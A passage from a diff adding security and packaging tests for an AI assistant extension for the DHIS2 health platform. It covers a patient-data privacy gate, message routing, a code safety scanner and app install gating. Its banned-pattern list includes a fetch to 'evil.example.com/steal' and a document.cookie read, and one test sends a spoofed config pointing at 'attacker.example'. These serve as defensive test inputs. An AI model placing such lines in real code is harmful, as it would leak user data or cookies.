+  truthy('apiUrl refuses a disguised path', threw);
+  Object.assign(d, saved);
+
+  // Privacy gate on its own: canonical path + boundary.
+  const prd = ctx.pathReadsPatientData;
+  truthy('gate sees through ../, ./, %2e, %74, backslash and #',
+    ['programs/../tracker/trackedEntities', './tracker/events', 'x/%2e%2e/tracker/enrollments', 'tracker/%74rackedEntities',
+     'tracker\\events', 'tracker/events#', 'programs/x/../../tracker/relationships?x=1', '/api/42/tracker/events.csv'].every(prd));
+  truthy('gate does not over-block metadata / aggregate paths',
+    !['programs/../dataElements', 'eventReports', 'eventVisualizations?fields=id', 'analytics/events/aggregate/a3kGcGpz8FJ', 'trackedEntityTypes', 'trackedEntityInstanceFilters'].some(prd));
+
+  // "Local" for privacy = where the requests go, not the preset name.
+  const stay = ctx.providerRequestsStayLocal, base = ctx.DEFAULT_PROVIDER_CONFIG || {};
+  truthy('default local Ollama stays local', stay({ providerType: 'ollama', apiBaseUrl: 'http://localhost:11434/v1' }));
+  truthy('an Ollama preset pointed at ollama.com is remote', !stay({ providerType: 'ollama', apiBaseUrl: 'https://ollama.com/v1' }));
+  truthy('anthropic with no URL (→ api.anthropic.com) is remote', !stay({ providerType: 'anthropic', apiBaseUrl: '' }));
+  truthy('a custom localhost server stays local', stay({ providerType: 'custom', apiBaseUrl: 'http://127.0.0.1:1234/v1' }));
+  truthy('isLocalProvider (API-key requirement) keeps its meaning', ctx.isLocalProvider({ providerType: 'ollama', apiBaseUrl: 'http://10.0.0.5:11434/v1' }));
+
+  // Message router: content scripts cannot reach privileged handlers.
+  const listener = messageListeners[0];
+  const call = (msg, sender) => new Promise((resolve) => {
+    if (listener(msg, sender, resolve) !== true) resolve('NO RESPONSE');
+  });
+  const page = { id: 'verify', url: 'http://localhost:8081/dhis-web-dashboard/', tab: { id: 2, windowId: 1 } };
+  const panel = { id: 'verify', url: 'chrome-extension://verify/sidepanel/panel.html' };
+  truthy('GET_API_KEY from a DHIS2 page (content script) gets no answer', (await call({ type: 'GET_API_KEY' }, page)) === 'NO RESPONSE');
+  truthy('SAVE_PROVIDER_CONFIG from a DHIS2 page is ignored', (await call({ type: 'SAVE_PROVIDER_CONFIG', payload: { config: { apiBaseUrl: 'https://attacker.example' } } }, page)) === 'NO RESPONSE');
+  truthy('CHAT_MESSAGE / MEMORY_GET from a DHIS2 page are ignored',
+    (await call({ type: 'CHAT_MESSAGE', payload: { text: 'delete all programs' } }, page)) === 'NO RESPONSE'
+    && (await call({ type: 'MEMORY_GET' }, page)) === 'NO RESPONSE');
+  const fromPanel = await call({ type: 'GET_API_KEY' }, panel);
+  truthy('the side panel still gets GET_API_KEY answered', fromPanel && fromPanel !== 'NO RESPONSE' && 'key' in fromPanel);
+
+  // Background tabs cannot move the page context.
+  const sent = [];
+  chrome.runtime.sendMessage = (m) => { sent.push(m); return Promise.resolve(); };
+  chrome.tabs.query = () => Promise.resolve([{ id: 1, windowId: 1 }]); // the focused tab is #1
+  const STAGE = 'T7P34dKkJvS';
+  d.pageContext = { appType: 'Capture', programId: 'OkA1bPReqR1' };
+  d.programMetadata = { id: 'OkA1bPReqR1', programStages: [{ id: STAGE }] };
+  await call({ type: 'DHIS2_STAGE_DETECTED', payload: { stageId: STAGE } }, { ...page, tab: { id: 2, windowId: 1 } });
+  truthy('stage detected in a BACKGROUND tab is ignored', d.pageContext.stageId === undefined);
+  await call({ type: 'DHIS2_STAGE_DETECTED', payload: { stageId: STAGE } }, { ...page, tab: { id: 1, windowId: 1 } });
+  truthy('stage detected in the focused tab is applied', d.pageContext.stageId === STAGE);
+  truthy('a content script cannot report another origin', (await call({ type: 'DHIS2_CONTEXT_UPDATE', payload: { url: 'https://other.example/apps/capture' } }, { ...page, tab: { id: 1 } })).ignored === true);
+
+  // initializeFromUrl: one run per URL, serialized, latest navigation wins.
+  const realNow = ctx.initializeFromUrlNow;
+  let runs = [], active = 0, maxActive = 0;
+  ctx.initializeFromUrlNow = async (url) => {
+    runs.push(url); active++; maxActive = Math.max(maxActive, active);
+    await Promise.resolve(); await Promise.resolve();
+    active--;
+    return { success: true, url };
+  };
+  const A = 'http://localhost:8081/apps/capture#/?programId=a3kGcGpz8FJ', B = 'http://localhost:8081/apps/capture#/?programId=b3kGcGpz8FJ';
+  const same = await Promise.all([ctx.initializeFromUrl(A), ctx.initializeFromUrl(A), ctx.initializeFromUrl(A)]);
+  truthy('3 concurrent calls for one URL → ONE context load', runs.length === 1 && same.every((r) => r.url === A));
+  runs = [];
+  const [ra, rb] = await Promise.all([ctx.initializeFromUrl(A), ctx.initializeFromUrl(B)]);
+  truthy('A then B at once → only B loads; A\'s caller gets B\'s result', runs.length === 1 && runs[0] === B && ra.url === B && rb.url === B);
+  truthy('context loads never overlap', maxActive === 1);
+  ctx.initializeFromUrlNow = realNow;
+  delete chrome.runtime.sendMessage;
+  chrome.tabs.query = () => Promise.resolve([]);
+  await flush();
+  hardeningChecksDone = true;
+})().catch((e) => { hardeningChecksDone = true; bad(`hardening checks threw: ${e && e.stack || e}`); });
+
+// ── manage_custom_app (src/tools-apps.js) ───────────────────────────────────
+// Runs from the verdict's setImmediate, AFTER every other async block has
+// drained, because it swaps the shared fetch / safeDhis2Fetch stubs. Still
+// microtask-only: the kit is served from disk through a resolved-promise fetch
+// stub, Sucrase and fflate are synchronous.
+async function runCustomAppChecks() {
+  console.log('\nCustom apps & plugins (manage_custom_app):');
+  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
+  const eq = (label, got, want) => (JSON.stringify(got) === JSON.stringify(want) ? ok(`${label} => ${JSON.stringify(got)}`) : bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`));
+  const d = ctx.__dhis2();
+  const saved = { baseUrl: d.baseUrl, apiVersion: d.apiVersion, writeAuth: d.writeAuth, fetch: ctx.fetch, sdf: ctx.safeDhis2Fetch };
+  d.baseUrl = 'http://localhost:8081'; d.apiVersion = 42;
+
+  // Keys: slugified from the name, always ai-, [a-z0-9-], ≤ 40 chars.
+  eq('slug("ANC coverage widget")', ctx.slugifyCustomAppKey('ANC coverage widget'), 'ai-anc-coverage-widget');
+  eq('slug("AI Demo") keeps a single ai- prefix', ctx.slugifyCustomAppKey('AI Demo'), 'ai-demo');
+  truthy('slug of an Arabic-only name is a stable ai-app-<hash>', /^ai-app-[a-z0-9]+$/.test(ctx.slugifyCustomAppKey('ملخص الوحدات')) && ctx.slugifyCustomAppKey('ملخص الوحدات') === ctx.slugifyCustomAppKey('ملخص الوحدات'));
+  truthy('slug of a very long name is ≤ 40 chars and has no trailing hyphen', (() => { const k = ctx.slugifyCustomAppKey('A very long name for a dashboard widget that shows many things'); return k.length <= 40 && !k.endsWith('-'); })());
+  truthy('explicit key without ai- prefix is refused', !!ctx.resolveCustomAppKey({ key: 'demo' })._error);
+  truthy('explicit key with upper case / underscore is refused', !!ctx.resolveCustomAppKey({ key: 'ai-Bad_Key' })._error);
+  eq('valid explicit key is kept', ctx.resolveCustomAppKey({ key: 'ai-kpi-2' }).key, 'ai-kpi-2');
+  eq('version bump patch / minor', [ctx.bumpCustomAppVersion('1.0.0'), ctx.bumpCustomAppVersion('1.2.3', 'minor')], ['1.0.1', '1.3.0']);
+  const bk = ctx.customAppBackupKey('ai-kpi-2');
+  eq('backup key round-trips the app key (hyphenated keys)', ctx.parseCustomAppBackupKey(bk) && ctx.parseCustomAppBackupKey(bk).appKey, 'ai-kpi-2');
+  eq('a metadata backup key is not an app backup', ctx.parseCustomAppBackupKey('backup-20260708T111347Z-update-uY6mWX'), null);
+
+  // Compile: Sucrase errors carry line / column + a code frame.
+  const brokenJsx = 'const A = () => (\n  <div>\n    <span>x</div>\n);';
+  const ce = ctx.compileCustomAppFile('app.jsx', brokenJsx);
+  truthy('JSX syntax error → line/column + frame', ce.error && ce.error.line === 3 && ce.error.column > 0 && /3 \|/.test(ce.error.frame));
+  const crossed = ctx.compileCustomAppFile('app.jsx', 'const A = () => <h1 className="t">Title</h2>;');
+  truthy('crossed tags (<h1>…</h2>) are an error — Sucrase alone would compile them silently', crossed.error && /<\/h2> found where <\/h1> was expected/.test(crossed.error.message));
+  const missingParen = ctx.compileCustomAppFile('app.jsx', 'const A = () => (\n  <div>\n    {a.map(x => <b>{x}</b>}\n  </div>\n);');
+  truthy('a missing ")" before "}" is reported on its own line (not where Sucrase backtracked)', missingParen.error && missingParen.error.line === 3 && /"\)" was expected/.test(missingParen.error.message));
+  truthy('valid JSX compiles to React.createElement', /React\.createElement\(/.test(ctx.compileCustomAppFile('app.jsx', 'const A = () => <b>x</b>;').code || ''));
+
+  // Safety scan.
+  const scan = (src, opts) => ctx.scanCustomAppCode({ 'app.jsx': ctx.compileCustomAppFile('app.jsx', src).code }, { allowedOrigin: 'http://localhost:8081', ...(opts || {}) });
+  const banned = {
+    eval: 'eval("1+1");',
+    'new-function': 'const f = new Function("return 1");',
+    cookie: 'const c = document.cookie;',
+    'browser-storage': 'localStorage.setItem("a", "b");',
+    'script-tag': 'const s = "<script src=x></script>";',
+    'external-request': 'fetch("https://evil.example.com/steal");',
+    import: 'import x from "y";',
+    require: 'const x = require("y");',
+    'html-injection': 'const A = () => <div dangerouslySetInnerHTML={{ __html: "x" }} />;',
+    socket: 'new WebSocket("wss://x");',
+  };
+  for (const [rule, src] of Object.entries(banned)) {
+    truthy(`safety scan catches ${rule}`, scan(src).some((v) => v.rule === rule));
+  }
+  truthy('UI text that merely mentions localStorage / eval() is not flagged', scan('const A = () => <p>Nothing is kept in localStorage or passed to eval()</p>;').length === 0);
+  truthy('same-origin absolute fetch is allowed', scan('fetch("http://localhost:8081/api/42/me");').length === 0);
+  const writeSrc = 'const { useDataMutation } = D2Runtime;\nconst M = { resource: "dataStore/ai-x/k", type: "create", data: {} };\nfunction A() { const [m] = useDataMutation(M); return null; }';
+  truthy('mutation refused when needs_write_access is false', scan(writeSrc).some((v) => v.rule.startsWith('write:')));
+  eq('mutation allowed when needs_write_access is true', scan(writeSrc, { needsWriteAccess: true }).length, 0);
+  truthy('fetch with method POST refused when read-only', scan('fetch("/api/42/dataStore/x/y", { method: "POST" });').some((v) => v.rule === 'write:http-write'));
+
+  // Lint: the runtime errors a blank page would otherwise hide.
+  const kitMeta = JSON.parse(fs.readFileSync(path.join(ROOT, 'libs/d2-kit/KIT_VERSION.json'), 'utf8'));
+  const lint = (src, kind = 'app') => ctx.lintCustomAppCode({ 'app.jsx': ctx.compileCustomAppFile('app.jsx', src).code }, kind, kitMeta);
+  const root = "\nReactDOMClient.createRoot(document.getElementById('root')).render(<A />);";
+  truthy('undeclared <Card> is an error naming the D2UI fix', lint('const A = () => <Card>x</Card>;' + root).errors.some((e) => /Card/.test(e.message) && /D2UI/.test(e.message)));
+  truthy('a name D2UI does not export is an error', lint('const { Grid } = D2UI;\nconst A = () => <Grid />;' + root).errors.some((e) => /no export "Grid"/.test(e.message)));
+  truthy('bare useState() without destructuring is an error', lint('const A = () => { const [a] = useState(0); return a; };' + root).errors.some((e) => /useState/.test(e.message)));
+  truthy('inline useDataQuery({…}) is an error (static-input trap)', lint('const { useDataQuery, DataProvider } = D2Runtime;\nconst A = () => { useDataQuery({ a: { resource: "me" } }); return null; };' + root).errors.some((e) => /inline object/.test(e.message)));
+  truthy('HeaderBar is refused (Global Shell draws it)', lint('const { HeaderBar } = D2UI;\nconst A = () => <HeaderBar />;' + root).errors.some((e) => /HeaderBar/.test(e.message)));
+  {
+    // dataStore key reads: a 404 until the key exists (live 2026-10-22).
+    const ds = (src) => lint(src + root).errors.some((e) => /is read directly, which is a 404/.test(e.message));
+    truthy('reading dataStore/<ns>/<key> directly is an error (404 until the first save)', ds("const { useDataEngine, DataProvider } = D2Runtime;\nconst KEY = `dataStore/${D2_APP_CONFIG.namespace}/notes`;\nconst A = () => { const engine = useDataEngine(); engine.query({ n: { resource: KEY } }); return null; };"));
+    truthy('…a key path inside a mutation (type: create) is fine', !ds("const { useDataEngine, DataProvider } = D2Runtime;\nconst A = ({ id }) => { const engine = useDataEngine(); engine.mutate({ resource: `dataStore/${D2_APP_CONFIG.namespace}/${id}`, type: 'create', data: { a: 1 } }); return null; };"));
+    truthy('…and the filter=_:eq: read keeps the whole app clean', !ds("const { useDataEngine, DataProvider } = D2Runtime;\nconst S = { s: { resource: `dataStore/${D2_APP_CONFIG.namespace}`, params: { fields: '.', filter: '_:eq:notes' } } };\nconst KEY = `dataStore/${D2_APP_CONFIG.namespace}/notes`;\nconst A = () => null;"));
+  }
+  {
+    // An always-open Modal blocks the whole app (live 2026-10-22).
+    const modal = (body) => lint("const { Modal, ModalTitle } = D2UI;\nconst A = ({ t, open }) => " + body + ";" + root).errors.some((e) => /rendered unconditionally/.test(e.message));
+    truthy('an unconditional <Modal> child is an error (its backdrop blocks every click)', modal('<div><p>x</p><Modal><ModalTitle>Delete</ModalTitle></Modal></div>'));
+    truthy('…{t && <Modal>}, a ternary, hide={!open} and a component returning a Modal are fine',
+      !modal('<div>{t && <Modal><ModalTitle>D</ModalTitle></Modal>}</div>') && !modal('<div>{t ? <Modal><ModalTitle>D</ModalTitle></Modal> : null}</div>')
+      && !modal('<div><Modal hide={!open}><ModalTitle>D</ModalTitle></Modal></div>') && !modal('<Modal><ModalTitle>D</ModalTitle></Modal>'));
+  }
+  {
+    // Mutation shapes app-runtime refuses at runtime (live 2026-10-22).
+    const mu = (body) => lint("const { useDataEngine, DataProvider } = D2Runtime;\nconst A = ({ rest, last, k }) => { const engine = useDataEngine(); " + body + " return null; };" + root).errors.map((e) => e.message).join(' | ');
+    truthy("{ type: last ? 'delete' : 'update', data } is an error (Invalid query at runtime)", /does not support property 'data'/.test(mu("engine.mutate({ resource: `dataStore/x/${k}`, type: last ? 'delete' : 'update', data: rest });")));
+    truthy("{ type: 'create', id } is an error", /does not support property 'id'/.test(mu("engine.mutate({ resource: 'dataStore/x', type: 'create', id: k, data: rest });")));
+    truthy("{ type: 'delete' } without data and { type: 'update', data } are fine", !/does not support/.test(mu("engine.mutate({ resource: `dataStore/x/${k}`, type: 'delete' }); engine.mutate({ resource: `dataStore/x/${k}`, type: 'update', data: rest });")));
+    truthy("a non-mutation object with type 'delete' (no resource) is not flagged", !/does not support/.test(mu("const action = { type: 'delete', data: rest };")));
+  }
+  {
+    // dhis2_query: ;-joined metadata filters are a 400 (live 2026-10-22).
+    const h = ctx.healJoinedMetadataFilters;
+    const split = new URLSearchParams(h('programs?fields=id&filter=programType:eq:WITH_REGISTRATION;displayName:ilike:mch').split('?')[1]).getAll('filter');
+    truthy('joined metadata filters are split into one filter parameter each', JSON.stringify(split) === JSON.stringify(['programType:eq:WITH_REGISTRATION', 'displayName:ilike:mch']));
+    truthy('…analytics ou:A;B filters stay joined', h('analytics?dimension=pe:THIS_YEAR&filter=ou:USER_ORGUNIT;USER_ORGUNIT_CHILDREN') === 'analytics?dimension=pe:THIS_YEAR&filter=ou:USER_ORGUNIT;USER_ORGUNIT_CHILDREN');
+    truthy('…a single filter or a value with ; that is not an expression is untouched', h('programs?filter=displayName:eq:a') === 'programs?filter=displayName:eq:a' && h('dataElements?filter=name:like:a;b') === 'dataElements?filter=name:like:a;b');
+  }
+  truthy('a plugin without the getPropsFromParent handshake is an error', ctx.lintCustomAppCode({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', 'const A = () => null;' + root).code }, 'plugin', kitMeta).errors.some((e) => /getPropsFromParent/.test(e.message)));
+  {
+    // Capture enrollment plugins (props verified against the plugins installed on 2.42 / Capture 106).
+    const capLint = (src) => ctx.lintCustomAppCode({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', src + root).code }, 'plugin', kitMeta, 'CAPTURE').warnings.map((w) => w.message).join(' | ');
+    const shake = "\npostRobot.send(window.parent, 'getPropsFromParent');";
+    truthy('CAPTURE: missing setPluginHeight warns that Capture sizes the widget to the reported height', /Capture sizes the widget/.test(capLint('const A = ({ enrollmentId }) => enrollmentId;' + shake)));
+    truthy('CAPTURE: a plugin that reads neither enrollmentId/teiId nor values/setFieldValue is warned', /neither enrollmentId \/ teiId/.test(capLint('const A = ({ enrollment }) => enrollment;' + shake)));
+    truthy('CAPTURE: reading enrollmentId clears that warning', !/neither enrollmentId/.test(capLint('const A = ({ enrollmentId, setPluginHeight }) => enrollmentId;' + shake)));
+    truthy('CAPTURE: a form-field plugin (values / setFieldValue) is not told to read enrollmentId', !/neither enrollmentId/.test(capLint("const A = ({ values, setFieldValue }) => { setFieldValue({ fieldId: 'x', value: values.y }); return null; };" + shake)));
+    truthy('CAPTURE: reporting a wrapper offsetHeight (not #root) is warned', /Report the height of #root/.test(capLint('const A = ({ enrollmentId, setPluginHeight }) => { const ref = React.useRef(null); setPluginHeight(ref.current.offsetHeight); return enrollmentId; };' + shake)));
+    truthy('DASHBOARD wording unchanged for dashboard plugins', /dashboard item keeps its default height/.test(ctx.lintCustomAppCode({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', 'const A = () => null;' + shake + root).code }, 'plugin', kitMeta, 'DASHBOARD').warnings.map((w) => w.message).join(' ')));
+    const where = ctx.customAppWhereToFind({ name: 'Meds', key: 'ai-meds', plugin_launch_url: 'http://x/api/apps/ai-meds/plugin.html' }, 'plugin', 'CAPTURE').join(' ');
+    truthy('CAPTURE where_to_find says it is not placed yet and how to place it (place action / Configurator)', /Not placed yet/.test(where) && /action="place"/.test(where) && /Tracker Plugin Configurator/.test(where));
+    truthy('the manual documents the verified Capture props', /teiId, programId, enrollmentId, orgUnitId/.test(ctx.MANUAL_EXTRAS.manage_custom_app || ''));
+    const agentSrc = fs.readFileSync(path.join(ROOT, 'src/agent.js'), 'utf8');
+    truthy('a cut-off manage_custom_app call gets code-shrinking advice, not program-splitting advice', /toolName === 'manage_custom_app'\s*\n[^\n]*\n\s*\? `Write SHORTER source/.test(agentSrc));
+  }
+  const clean = "const { useState } = React;\nconst { DataProvider, useDataQuery } = D2Runtime;\nconst { Card, CircularLoader } = D2UI;\nconst Q = { me: { resource: 'me' } };\nfunction Box({ icon: Icon }) { return <Icon />; }\nfunction A() { const [n] = useState(0); const { loading } = useDataQuery(Q); return loading ? <CircularLoader /> : <Card>{n}</Card>; }\nReactDOMClient.createRoot(document.getElementById('root')).render(<DataProvider baseUrl={D2_APP_CONFIG.baseUrl} apiVersion={D2_APP_CONFIG.apiVersion}><A /></DataProvider>);";
+  eq('a clean read-only app lints with no errors', lint(clean).errors, []);
+  // DHIS2 app-development skill conventions → advisory warnings.
+  const warns = (src) => lint(src + root).warnings.map((w) => w.message).join(' | ');
+  truthy('warning: metadata query without fields', /without a fields parameter/.test(warns("const Q = { p: { resource: 'programs', params: { paging: false } } };\nconst A = () => null;")));
+  truthy('warning: fields with name instead of displayName', /displayName/.test(warns("const Q = { p: { resource: 'programs', params: { fields: 'id,name' } } };\nconst A = () => null;")));
+  truthy('warning: delete without a confirmation Modal', /confirmation/.test(warns("const M = { resource: 'dataStore/x/y', type: 'delete' };\nconst A = () => null;")));
+  eq('no warnings for fields id,displayName', warns("const Q = { p: { resource: 'programs', params: { fields: 'id,displayName' } } };\nconst A = () => null;"), '');
+  eq('a clean read-only app passes the safety scan', scan(clean).length, 0);
+  const uids = ctx.extractCustomAppUids({ 'app.jsx': 'const a = "fbfJHSPpUQD"; const b = "dataElement"; const c = "ProgramName"; const d = "dx:IpHINAT79UW;Eoof9sGAqcT";' });
+  eq('UID extraction: real-looking ids only, not camelCase words', uids.sort(), ['Eoof9sGAqcT', 'IpHINAT79UW', 'fbfJHSPpUQD']);
+
+  // Stubbed transport: the kit comes from disk; /api/apps answers from APPS.
+  let APPS = [];
+  let calls = [];
+  ctx.fetch = (url) => {
+    const u = String(url);
+    calls.push(u);
+    if (u.startsWith('chrome-extension://verify/')) {
+      const abs = path.join(ROOT, u.slice('chrome-extension://verify/'.length));
+      const buf = fs.existsSync(abs) ? fs.readFileSync(abs) : null;
+      return Promise.resolve({ ok: !!buf, status: buf ? 200 : 404, text: async () => buf.toString('utf8'), arrayBuffer: async () => buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.length) });
+    }
+    return Promise.reject(new Error('network disabled in verify: ' + u));
+  };
+  ctx.safeDhis2Fetch = async (p, o) => {
+    calls.push(`${(o && o.method) || 'GET'} ${p}`);
+    if (p === 'apps') return APPS;
+    if (/^metadata\?fields=id&filter=id:in:/.test(p)) return { programs: [{ id: 'fbfJHSPpUQD' }] };
+    if (p === 'system/info?fields=version') return { version: '2.42.5.1' };
+    return { _error: 'unexpected call in verify: ' + p };
+  };
+
+  // Packaging per kind: expected files, manifest fields, echarts only when used.
+  const unzip = (z) => ctx.fflate.unzipSync(z);
+  const td = new TextDecoder();
+  const mkSpec = (kind, sources, extra) => Object.assign(ctx.customAppSpecFromArgs({ name: 'Verify app', kind, plugin_type: kind === 'app' ? undefined : 'DASHBOARD' }, 'ai-verify-app', null), { sources }, extra || {});
+  const appSrc = clean;
+  const pluginSrc = "const { DataProvider } = D2Runtime;\nconst P = () => <div>p</div>;\nconst root = ReactDOMClient.createRoot(document.getElementById('root'));\npostRobot.send(window.parent, 'getPropsFromParent').then(({ data }) => root.render(<DataProvider baseUrl={D2_APP_CONFIG.baseUrl} apiVersion={D2_APP_CONFIG.apiVersion}><P {...data} /></DataProvider>));";
+  const kinds = {
+    app: { 'app.jsx': appSrc },
+    plugin: { 'plugin.jsx': pluginSrc },
+    app_and_plugin: { 'app.jsx': appSrc, 'plugin.jsx': pluginSrc, 'shared.jsx': 'const SHARED = 1;' },
+  };
+  for (const [kind, sources] of Object.entries(kinds)) {
+    const prep = await ctx.prepareCustomAppBuild(mkSpec(kind, { ...sources }));
+    if (prep._error) { bad(`package ${kind}: ${prep._error} ${JSON.stringify(prep.problems || prep.violations || '')}`); continue; }
+    const files = unzip(prep.pkg.zip);
+    const m = JSON.parse(td.decode(files['manifest.webapp']));
+    const ai = JSON.parse(td.decode(files['src/manifest.ai.json']));
+    const need = ['manifest.webapp', 'app-config.js', 'd2-kit.min.js', 'd2-kit.css', 'fonts/roboto-latin-400-normal.woff2', 'src/manifest.ai.json']
+      .concat(kind !== 'plugin' ? ['index.html', 'app.js', 'src/app.jsx'] : [])
+      .concat(kind !== 'app' ? ['plugin.html', 'plugin.js', 'src/plugin.jsx'] : [])
+      .concat(kind === 'app_and_plugin' ? ['shared.js', 'src/shared.jsx'] : []);
+    const missing = need.filter((f) => !files[f]);
+    truthy(`${kind}: zip has ${need.length} expected files`, missing.length === 0 || missing);
+    truthy(`${kind}: manifest short_name/developer/namespace`, m.short_name === 'ai-verify-app' && m.developer && m.developer.company === 'dhis2-ai-assistant' && m.activities.dhis.namespace === 'ai-verify-app');
+    truthy(`${kind}: launch_path ${kind === 'plugin' ? 'omitted' : 'set'}, plugin fields ${kind === 'app' ? 'omitted' : 'set'}`,
+      (kind === 'plugin' ? !m.launch_path : m.launch_path === 'index.html') && (kind === 'app' ? !m.plugin_launch_path && !m.plugin_type : m.plugin_launch_path === 'plugin.html' && m.plugin_type === 'DASHBOARD'));
+    truthy(`${kind}: AI manifest marker + file list`, ai.created_by === 'dhis2-ai-assistant' && ai.key === 'ai-verify-app' && ai.files.length === Object.keys(sources).length && ai.kit_version === kitMeta.kit_version);
+    truthy(`${kind}: no echarts.min.js when the code does not use it`, !files['echarts.min.js']);
+    truthy(`${kind}: D2_APP_CONFIG carries serverVersion {major:2,minor:42} and apiVersion 42`, /"serverVersion":\{"major":2,"minor":42,"patch":5,"full":"2\.42\.5\.1"\}/.test(td.decode(files['app-config.js'])) && /"apiVersion":42/.test(td.decode(files['app-config.js'])));
+    if (kind === 'app_and_plugin') {
+      const html = td.decode(files['plugin.html']);
+      truthy('plugin.html loads kit → config → shared → plugin in order, body.d2-plugin, dir=auto',
+        /d2-kit\.min\.js[\s\S]*app-config\.js[\s\S]*shared\.js[\s\S]*plugin\.js/.test(html) && /<body class="d2-plugin">/.test(html) && /<html dir="auto">/.test(html));
+      const capHtml = ctx.buildCustomAppHtml({ name: 'x', pluginType: 'CAPTURE', usesEcharts: false, sources: { 'plugin.jsx': '' } }, 'plugin.js');
+      truthy('a CAPTURE plugin page is auto-height (no body.d2-plugin) and links capture-plugin.css (#root flow-root)', /<body class="d2-capture-plugin">/.test(capHtml) && !/d2-plugin"/.test(capHtml) && /href="capture-plugin\.css"/.test(capHtml) && /flow-root/.test(ctx.CAPTURE_PLUGIN_CSS || vm.runInContext('CAPTURE_PLUGIN_CSS', ctx)));
+    }
+  }
+  const chartSrc = appSrc.replace('function A() {', 'function C() { const el = React.useRef(null); React.useEffect(() => { echarts.init(el.current); }, []); return <div ref={el} />; }\nfunction A() {');
+  const pc = await ctx.prepareCustomAppBuild(mkSpec('app', { 'app.jsx': chartSrc }));
+  truthy('echarts.min.js is bundled (and loaded before app.js) when the code uses echarts',
+    !pc._error && unzip(pc.pkg.zip)['echarts.min.js'] && /echarts\.min\.js[\s\S]*app\.js/.test(td.decode(unzip(pc.pkg.zip)['index.html'])));
+  const unk = await ctx.prepareCustomAppBuild(mkSpec('app', { 'app.jsx': clean.replace("resource: 'me'", "resource: 'programs/AbCdEfGh123'") }));
+  truthy('a hard-coded UID that does not exist on the server is refused', unk.unknown_uids && unk.unknown_uids[0] === 'AbCdEfGh123');
+  {
+    const savedSdf = ctx.safeDhis2Fetch;
+    ctx.safeDhis2Fetch = async (p, o) => (/^metadata\?fields=id&filter=id:in:/.test(p) ? { programIndicators: [{ id: 'YTg1u5yjZKQ' }], programs: [{ id: 'fbfJHSPpUQD' }] } : savedSdf(p, o));
+    try {
+      const evAgg = clean.replace("resource: 'me'", "resource: 'analytics/events/aggregate/fbfJHSPpUQD', params: { dimension: ['ou:USER_ORGUNIT', 'YTg1u5yjZKQ'] }");
+      const piBad = await ctx.prepareCustomAppBuild(mkSpec('app', { 'app.jsx': evAgg }));
+      truthy('program indicators read through analytics/events/aggregate are refused at preview (409 E7224 in the browser)', /refuses program indicators there/.test(piBad._error || ''));
+      const piOk = await ctx.prepareCustomAppBuild(mkSpec('app', { 'app.jsx': clean.replace("resource: 'me'", "resource: 'analytics', params: { dimension: ['dx:YTg1u5yjZKQ', 'ou:USER_ORGUNIT'] }") }));
+      truthy('…the plain analytics resource with dx: passes', !/refuses program indicators/.test(piOk._error || ''));
+    } finally { ctx.safeDhis2Fetch = savedSdf; }
+  }
+
+  // Never touch apps the assistant did not build.
+  calls = [];
+  const notAi = await ctx.executeManageCustomApp({ action: 'delete', key: 'dashboard' });
+  truthy('delete "dashboard" (no ai- prefix) refused before any request', notAi._refused_not_managed && calls.length === 0);
+  APPS = [{ key: 'ai-demo', name: 'AI Demo', version: '1.0.0', folderName: 'apps/ai-demo' }];
+  d.writeAuth = { scope: 'broad', reason: 'verify' };
+  const noMarker = await ctx.executeManageCustomApp({ action: 'update', key: 'ai-demo', files: { 'app.jsx': appSrc } });
+  truthy('update of an ai- app WITHOUT the assistant marker is refused', noMarker._refused_not_managed);
+  truthy('…without fetching its files (no probe that would 404)', !calls.some((c) => /\/api\/apps\/ai-demo\//.test(c)));
+  truthy('delete of an ai- app without the marker is refused', (await ctx.executeManageCustomApp({ action: 'delete', key: 'ai-demo' }))._refused_not_managed);
+  truthy('rollback of an ai- app without the marker is refused', (await ctx.executeManageCustomApp({ action: 'rollback', key: 'ai-demo' }))._refused_not_managed);
+
+  // Conflicts are caught client-side (no 409 round trip).
+  APPS = [{ key: 'ai-other', folderName: 'apps/ai-verify-app', activities: { dhis: { namespace: 'ai-verify-app' } } }];
+  const conf = ctx.customAppConflicts(mkSpec('app', {}), APPS, 'create').map((c) => c.code).sort();
+  eq('namespace + upload-folder collisions detected before upload', conf, ['folder_in_use', 'namespace_in_use']);
+
+  // requireWriteAuth gates every write action.
+  APPS = [{ key: 'ai-verify-app', name: 'Verify app', version: '1.0.0', folderName: 'apps/ai-verify-app', developer: { company: 'dhis2-ai-assistant' } }];
+  d.writeAuth = { scope: 'read_only', reason: 'verify: no authorization' };
+  const gated = (r) => r && r._scope === 'requires_user_confirmation' && /manage_custom_app/.test(r._error);
+  truthy('create is refused on a read-only turn', gated(await ctx.executeManageCustomApp({ action: 'create', key: 'ai-verify-new', name: 'New', files: { 'app.jsx': appSrc } })));
+  truthy('delete is refused on a read-only turn', gated(await ctx.executeManageCustomApp({ action: 'delete', key: 'ai-verify-app' })));
+  const aiManifest = { key: 'ai-verify-app', name: 'Verify app', kind: 'app', version: '1.0.0', created_by: 'dhis2-ai-assistant', files: ['app.jsx'] };
+  ctx.fetch = ((inner) => (url, o) => {
+    const u = String(url);
+    if (u.endsWith('/api/apps/ai-verify-app/src/manifest.ai.json')) return Promise.resolve({ ok: true, status: 200, type: 'basic', text: async () => JSON.stringify(aiManifest) });
+    if (u.endsWith('/api/apps/ai-verify-app/src/app.jsx')) return Promise.resolve({ ok: true, status: 200, type: 'basic', text: async () => appSrc });
+    return inner(url, o);
+  })(ctx.fetch);
+  truthy('update is refused on a read-only turn', gated(await ctx.executeManageCustomApp({ action: 'update', key: 'ai-verify-app', files: { 'app.jsx': appSrc } })));
+  const pv = await ctx.executeManageCustomApp({ action: 'preview', name: 'Verify app 2', files: { 'app.jsx': appSrc } });
+  truthy('preview runs on a read-only turn (discovery) and returns a token', pv.preview === true && /^pv-[0-9a-f]{16}$/.test(pv.preview_token || ''));
+  {
+    // Approval = the user's next message, unless they already asked to install
+    // (GLM installed right after "Show me a preview first", live 2026-10-22).
+    const asked = ctx.userAskedToInstall;
+    for (const t of ['Please create and install and enrollment plugin here', 'yes install it', 'build it and deploy it to the server'])
+      truthy(`install intent: "${t}"`, asked(t));
